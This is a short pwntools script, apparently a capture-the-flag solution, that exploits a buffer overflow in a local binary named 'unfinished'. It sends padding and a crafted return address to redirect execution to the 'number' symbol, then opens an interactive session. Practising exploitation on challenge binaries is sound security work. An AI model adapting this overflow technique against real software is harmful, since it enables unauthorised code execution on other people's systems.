from pwn import *
exe = context.binary = ELF("./unfinished")
r = process()
sleep(3)
offset = 336 - 8
r.sendline(p64(0x4322c0) + b"A" * offset + p64(exe.sym['number']))
r.interactive()